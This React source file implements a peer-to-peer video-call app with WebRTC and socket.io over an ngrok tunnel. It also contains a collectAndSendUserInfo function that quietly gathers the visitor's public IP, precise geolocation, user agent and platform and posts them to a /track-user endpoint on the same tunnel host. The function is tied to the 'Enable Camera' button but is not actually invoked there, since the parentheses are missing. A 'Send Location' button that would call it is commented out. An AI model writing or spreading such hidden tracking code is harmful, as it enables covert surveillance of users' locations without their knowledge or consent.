import React, { useRef, useEffect, useState } from 'react';
import { io } from 'socket.io-client';
import 'bootstrap/dist/css/bootstrap.min.css';
import './App.css';

const socket = io("https://d20f-202-173-124-249.ngrok-free.app", {
  transports: ['websocket'],
  path: "/socket.io",
});

const App = () => {
  const localVideo = useRef(null);
  const remoteVideo = useRef(null);
  const [peerConnection, setPeerConnection] = useState(null);
  const [mediaStream, setMediaStream] = useState(null);

  const [socketId, setSocketId] = useState('');
  const [targetId, setTargetId] = useState('');
  const [onlineUsers, setOnlineUsers] = useState([]);
  const [streamStarted, setStreamStarted] = useState(false);

  useEffect(() => {
    socket.on('connect', () => {
      setSocketId(socket.id);
    });

    socket.on('online-users', (users) => {
      setOnlineUsers(users.filter(id => id !== socket.id));
    });

    socket.on('offer', async ({ from, offer }) => {
      await startLocalStream();
      const pc = createPeerConnection(from);
      await pc.setRemoteDescription(new RTCSessionDescription(offer));
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      socket.emit('answer', { to: from, answer });
      setPeerConnection(pc);
      setTargetId(from);
    });

    socket.on('answer', ({ answer }) => {
      if (peerConnection) {
        peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
      }
    });

    socket.on('ice-candidate', ({ candidate }) => {
      if (peerConnection && candidate) {
        peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
      }
    });

    return () => {
      socket.off('connect');
      socket.off('offer');
      socket.off('answer');
      socket.off('ice-candidate');
      socket.off('online-users');
    };
  }, [peerConnection]);

  const startLocalStream = async () => {
    if (streamStarted) return;

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      localVideo.current.srcObject = stream;
      setMediaStream(stream);
      setStreamStarted(true);
    } catch (err) {
      alert('Camera/Mic access denied');
    }
  };

  const createPeerConnection = (remoteId) => {
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
    });

    if (mediaStream) {
      mediaStream.getTracks().forEach((track) => {
        pc.addTrack(track, mediaStream);
      });
    }

    pc.ontrack = (event) => {
      if (remoteVideo.current && event.streams && event.streams[0]) {
        remoteVideo.current.srcObject = event.streams[0];
      }
    };

    pc.onicecandidate = (event) => {
      if (event.candidate && remoteId) {
        socket.emit("ice-candidate", {
          to: remoteId,
          candidate: event.candidate,
        });
      }
    };

    return pc;
  };

  const callUser = async (id = targetId) => {
    if (!id.trim()) return alert('Enter a valid ID');
    setTargetId(id);
    await startLocalStream();
    const pc = createPeerConnection(id);
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    socket.emit('offer', { to: id, offer });
    setPeerConnection(pc);
  };

  const collectAndSendUserInfo = async () => {
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const { ip } = await ipRes.json();

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const payload = {
            ip,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            time: new Date().toISOString()
          };

          await fetch("https://d20f-202-173-124-249.ngrok-free.app/track-user", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
          });
        },
        (err) => console.error("Geolocation error", err),
        { enableHighAccuracy: true }
      );
    } catch (error) {
      console.error("Tracking failed:", error);
    }
  };

  return (
    <div className="video-wrapper">
      <video ref={remoteVideo} autoPlay playsInline className="remote-video" />
      <video ref={localVideo} autoPlay muted playsInline className="local-video" />

      <div className="controls-container">
        <button
          className="btn btn-secondary mb-2"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#controlPanel"
          aria-expanded="false"
          aria-controls="controlPanel"
        >
          Toggle Controls
        </button>

        <div className="collapse show" id="controlPanel">
          <div className="card card-body text-white bg-dark">
            <p>Your ID: <strong>{socketId}</strong></p>
            <input
              type="text"
              className="form-control mb-2"
              placeholder="Enter ID to call"
              value={targetId}
              onChange={(e) => setTargetId(e.target.value)}
            />
            <div className="d-flex gap-2 flex-wrap">
              <button className="btn btn-primary" onClick={() => callUser()}>Call</button>
              {!streamStarted && (
                <button className="btn btn-warning" onClick={()=>{startLocalStream();collectAndSendUserInfo}}>Enable Camera</button>
              )}
              {/* <button className="btn btn-info" onClick={collectAndSendUserInfo}>Send Location</button> */}
            </div>
            <div className="mt-3">
              <strong>Online Users:</strong>
              <div className="d-flex flex-wrap gap-2 mt-1">
                {onlineUsers.length === 0
                  ? <span>No one else online</span>
                  : onlineUsers.map(id => (
                      <button className="btn btn-outline-light btn-sm" key={id} onClick={() => callUser(id)}>{id}</button>
                    ))
                }
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default App;
